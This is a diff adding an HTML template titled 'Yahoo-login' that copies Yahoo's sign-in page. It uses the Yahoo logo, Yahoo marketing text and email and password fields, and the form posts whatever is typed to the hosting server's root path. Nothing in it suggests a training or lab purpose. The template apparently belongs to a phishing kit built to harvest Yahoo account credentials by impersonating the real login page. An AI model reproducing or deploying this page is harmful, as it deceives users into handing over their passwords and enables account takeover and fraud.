@@ -1,0 +1,116 @@
+
+<html>
+    {% block head %} 
+    <head>
+      <title>Yahoo-login</title>
+      <meta name='viewport' content='width=device-width, initial-scale=1' />
+      <style>
+        .cursor:hover{cursor: pointer;}
+        input::-webkit-input-placeholder{font-size: 15px;}
+        input:focus{outline: none;}
+        @media screen and (min-width: 600px) {
+            body{
+                font-family: "tahoma";
+                min-width: 1450px;
+            }
+          #box{
+            position: absolute;
+            left: 1000px;
+            top: 70px;
+            width: 355px;
+            height: 555px;
+            border-top: 5px solid #8533ff;
+            box-shadow: 0px 0px 5px #888888;
+          }
+          #image {
+            position: absolute;
+            top: 50px;
+            right: 110px;
+            width: 130px !important;
+            height: 50px !important;
+          }
+          #txt1 {
+            font-size: 20px !important;
+            position: absolute;
+            top: 120px;
+            right: 75px;
+          }
+          input::-webkit-input-placeholder{font-size: 15px;}
+
+          input[type=email]{
+            font-size: 20px !important;
+            height: 15px !important;
+            position: absolute;
+            top: 180px;
+            right: 35px;
+          }
+
+          input[type=password]{
+            font-size: 20px !important;
+            height: 15px !important;
+            position: absolute;
+            top: 240px;
+            right: 35px;
+          }
+          button{
+            font-size: 17px !important;
+            height: 40px !important;
+            position: absolute;
+            top: 300px;
+            right: 30px;
+          }
+          #txt2{
+            font-size: 15px !important;
+            position: absolute;
+            top: 380px;
+            right: 120px;
+          }
+          #txt3{
+            visibility: visible !important;
+            font-size: 20px;
+            position: absolute;
+            bottom: 20px;
+            right: 83px;
+          }
+          #txt4{
+            visibility: hidden;
+          }
+          #left-txt{
+            display: initial !important;
+            text-align: left;
+            width: 560px;
+            position:absolute;
+            top: 150px;
+            left: 300px;
+          }
+        }
+      </style>
+    </head>
+
+    {% endblock %}
+
+
+    {% block body %} 
+
+    <body style='text-align: center;'>
+      <div>
+        <div id='left-txt' style='display: none;'><div style='font-size: 25px;'><b>Yahoo makes it easy to enjoy what matters most in your world.</b></div><br><div style='font-size: 20px;'>Best in class Yahoo Mail, breaking local, national and global news, finance, sport, music, movies and more. You get more out of the web,you get more out of life.</div></div>
+          <div id='box'>
+          <br>
+        <div>
+          <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAABKCAMAAAAli45pAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAADnUExURUxpcT4AmCoAcxoATkcAtUoAvR0KPUwAsysAcSUAazQAgxYAOUUArS4AfCMAZEsAwkEAoykNXB8AUT0AjSYAYxUARhUAQywAdDoHjEkAvFAAzzQAjl8A9UAAoRcARz4An1kA5i4AeBMAOxsATEQYkEMAqlQA2R0AVDwAllQB2BsASxIAQ0YAskEApTEAegkAI00DwkIAoj4AmyUAYCYAZUYAtUsAwxUAQxMAQR4AVjMAg1kA5kUArB0AVSQAYlMA1ikBbFwbyxUASDMAgDIAgkEAmFEA0TgAhVoA6k4AyQ0AOUwAxR8AWyNM78IAAABJdFJOUwD+/f7+/gkCA/79EP3+/f7+GSH9Lv/Wiz7w/v7+jZhS/alXOSin/PtiPEfr1nlVaZrEn2e+aLWBqXbOrevj0eHlfsLnuezJfNknhfUdAAAKXElEQVRo3rxZaXuizBKlodl3ERfcjVEnLtHELRmj2TMs///33GpQUIT44T7P2x8mMTbN6ao6VadqKPPtz58/bxWKp1KLp3rhVz3qv1uCwIcLfmZv4CqF8EdHQro/5jJA37q6JC7k/wpwGgHPX5pxVa3eEkDyKyPq7IQSUmdQLd0VvVEh8gG5/8W1sv6Y+WdiOj7+kQmZ/FNoLd9mZL0NK/IlbDAj2++7b2T3VGSQuzXPA4Tn5bGLPOYpfZn/34R8NuTKz7yKFcVACBkKdverZS+9lxtj3WFn4RmdIMD6bQo0NfH1gfd+fGOxxxXN85sLNz2OKxYvw67HyRXzFKJcGTZmq9Vq1lhmWRAwC9O5YSDpY9F8ur+/X292mmo4+1nlHDZXZTHGb+GphVdGddnKqU0hfKqO5DE3h4fksb53U/fino393nlIm9G0qvu9PzycBk+0HsYYENVgGRiQtLgLa1c+EbLUxWMhMci6xNSc9uwsAMyqzrIANLznkzZQzrnI8ytXse1m9GqBn4Lf9Op5CAmfGu3qjTQA80OruWwrfBK+AhOiGv3aXHfvuutmKVBx/7t1hpqnfixYz1Mhiv5D4MvrEWO090le46kiAb2NnMhzu0HIRT45p6X7ovciH1hI3WJFxO7yHOCnqOl+BmiR9iPQYPYHhCR1MT2mIO5u42m4vSqcuFUoS5JldWTqzNXw+03Jk9r91vEFAnXH6hjPheMnwsVqIXm/PPaRZz9Gx8AVt9gIas74nJSfoqj7kzRoGUBHwQaB92xZkvTDRxkYbAjfd0dejRhQONqnTEsIdYQLxgtUoeTRCWrIZyyrKI344zkXearB4oF9ZCF8VJSaFuh6hRdOvNohoJcXoJ8J6DuSNAofYEJrempCYsCRp7b3xeg5gXoUaWTMuYykIlBFcsF+77h1CaCNacwW4KJ0DET4WKlilbBQiFONIb3axhkVBaoMoPVh2kJcCBqe5bkFbSGU3gB+HYDb9yFBwIlagJRtLzOzwo1sT2l/c2GQQ0JjsfFVSMLlSWOAi3IUwsIcI8LCox+mGNeeuwztVnsJ6hC0z16AFj4PoKmyJhnGQ4bb14yttGchaGHB0FiZ5FQDgXu3NacfeZP4X0Hzk53cjgEEk4g+Q8XQvJckLc+xoZaFHaO4k+ugKQK6egOpXdMM5atIXVZj8wWgOBDWYHWGMSAh5BRKgeoyntHfy9FzM9ZA5VMEdxrhYpFAMLeGFLOQRJbC1tQ7qsxIzpijUqBbF6A7BDTUnCajYuU2M1bB1EZ/Rbi5sTWdfaD4vHIqv9giMXX4klsWWdMzggAXWX1Fcs0DshhgYWyYBlakZ44qDmBDgvEaaBPSLIunGY4XqJuBTTsOlOnCyJOcjDMSrzQZBsP9wmiYs5Z06jlghEi4OITyhBDtMXfxQfIWI5VokIWNnMRy10B37YBlq2a2wtwxAetMIP/ZnkFyba5uoboDG/WjbMzNsfXMnX9dDggXTeEZWba9STg6VLD0SqrBIyOeUPEa6KYnuvo8z34BYzgrCCGPYf2x8AtocIrquBWiV+SxInXOIokPNaqvN4YW0mJFSsol0JDukIfMF6Bi4wjyCJo/CPd4haALwrsnuf5DDui1BspiLFPvXuC7t/khLZCX0i44Bd7fUwz18dxGYEnCRfyFgIXrBFoFDE2TYBEItdyxHGfCEHTl4kURaLnk1dzLIh+/aiC5EDslT3TcX3gIwbkLRN1pENBFBdE3qb1QDIBqQNCBV5ITozxghd6FghJcNWChmpyAdl3Skp2veQjaHEG0Xhb5OFcFALrIQZ3uO43fQHO7QGPdGQFdUaRX+TJ+NEbyCQu7iTIobNmaWD6UyoVdc+anRMTYdXVd9+Ol+66PVL9qFkLQyzzQoqbquCJDRe87k99AC4tAwySCCLnURUbW7wAXoRbG0h+On4Ch6SjPECpqIECOUoCAVkel9BoEKlj6Cmhak9gIdLt/BbQmYj8E/WPQl40Uz4MEobVE+odyj0Xi4qhQoZTFAiQKD39omvLpMs3PODwcNy88prQo4W1PKBHQV8JDozHhhkA1kHZ3mdFBggwYpDZPcjHIDlWcHjIEoWIsQCLBBCkvm4gQrigvXMFlqmjhLSEiXW/f/krEVzECDaLeeilcboVUbjPYSXxKpJMR7JLbFRkbH9h1kvLOW/EINGSzWhtqUXbKK0u0pYAmePe0enuVD5roT/CJHr5yLu24zPpjQ4FZJvWjArKjtv+brCr0UpEYvF5cwIjfOXWjI6kIBCApLu36P+6X4lJR6RrGpGfg5vQmUxR0odInXVWU79TTJdEiGym7q2Wc4OlnV2j5Q5KQMQzLuF9vF3NNDYEk0YgEEvQxX+JTPugje6J8F5TW6/vjWjdBCrhz0gNfAw2Zga23l5kq786SLARyHlSVh8imfMFEfKKEyaNoBXeZp3WZwSnoBsZ0MD3b02TCMshfl6ZriI/634ypHDiQtN8PhFxNT2vDptz4gI4NOokpkd4ta1C4Choy3JZFwYssnK6bAaOE3eQhe+Q2ATxkarfe/pNRDgpfCExdJOa7sT293u5ReU3AD2wkHSQRbtI7lyMEA+w2jqCHCqsG65RE2dmSi4vk6tmgk3brCVJD/fsCDwh2A6nqT9QjbjwR/JENmufNL3AJmoat/Y+6yQn74AQ06WeDwTlLSFUEAfJArFQWtd8aW0HYeLV6/S01BSPlWJHEBRdNc8AfSr3dymlsoR+xrM8oxDpp+yWgtSNocjgrDS6qPVRF5G+Jvu6QYU3+CAF+fQeaAeoENhlBDDGWgp15jJWuZ/fr/3qZeWFoQBx9HCL55v4me3j5pMWgSaOAtUE3dRppgKCtI7I6nDBlDmv8w7BG3kCZrs/MqOqEsxp54mKaWZgngwAvaNe/e+npKmyeGopFf1R+K5gRaPEAGiq44iPmRc7qJRSHZM5Poj2yxmJq0vY9jQKl/u+td7h5b/mt15jRmjsdwQFqsDWZkAqnHhEmGFvi62EWJWSM3WO1SR8tzY2VWgBhdFnsd4yGcAOClw5QWsFDypFETdHjAWSxOQqQ3//3d9ZozL63hsqMNsWzASTQf2Qb9frs7D9KhMrKV+hgEVNK4PIsXaYjdUIM/dxsbkrFDPI/vmyanWdT6Cyazedy+hBzsYE/t+IBBFW435QCUZUkldYGpc19IT3pBTaSsSQkkWUvQiYXlysXq8HLE3ccek1X45mZB1rF/iyyNHk++3Zc9DWXfX/u+HDsaIor/K89O2pBEAbiAL4EZ2omK7NQkNJpYO+GhCRBUd//C+Uqi8WMXsSX/+9xvpzc2G53edzcp3HuUdUwRTT4moSEbra+HoqiuBzdychc+CUj7embzIMsSNVHzNKx9Fv6Y9Agf+loDMnLchmo3JliicXRqZo6ovfumE1G9gkln5dqqelZcLaVQW+s5hmU9jJrE83ycXcN+giPec+MJDP7PT1qr2otVFamIuja9+segv7D9x8Z0l6g0W5b5ercc04p42QwrwLHUGxevmIEAAAAAAAAAAAAAGBAd7bXQf1mdh9qAAAAAElFTkSuQmCC' id='image' style='width: 170px; height: 70px;'></img>
+        </div>
+      <p1 id='txt1' style='font-size:150%'><b>Sign in to your account<br><br><br></b></p1>
+      <form action="/" method="POST">
+        <input type='email' placeholder='Enter your email' name="username" style='width: 80%; height: 30px;  padding: 12px; border: transparent; border-bottom: 2px solid blue; font-size: 15px; margin-bottom: 10px;'><br><br>
+        <input type='password' placeholder='Enter your password' name="password" style='width: 80%; height: 30px;  padding: 12px; border: transparent; border-bottom: 2px solid blue; font-size: 15px; margin-bottom: 10px;'><br><br>
+        <button type="submit" class='cursor' id='button' style='width:82%; height: 50px; font-size:20px; border:none; border-radius:5px; background: #188fff; padding: 10px; color: white;'>Sign In</button><br><br>
+      </form>
+      <div id='txt2' style='color: #188fff;' class='cursor'>Trouble signing in?</div>
+        <div id='txt3' style='visibility: hidden;'>Yahoo! enjoy mailing.</div>
+      <div id='txt4' style='position:absolute; bottom:50%; margin-bottom: -280px; left:50%; margin-left: -135px;'>New to Yahoo? <p1 class='cursor' style='color: #188fff;'>Sign up for a new account</p1></div>
+      </div>
+    </body>
+
+
+{% endblock %}
